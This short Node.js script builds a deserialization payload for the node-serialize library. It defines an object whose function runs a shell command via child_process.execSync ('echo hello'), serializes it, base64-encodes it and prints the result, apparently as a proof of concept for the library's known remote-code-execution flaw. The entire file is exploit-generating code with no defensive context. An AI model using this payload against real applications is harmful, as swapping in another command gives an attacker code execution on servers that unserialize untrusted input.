const serializer = require("node-serialize");


x = {
cereal : function(){ process.mainModule.require('child_process').execSync('echo hello'); }
};

const payload = btoa(serializer.serialize(x));

console.log(payload);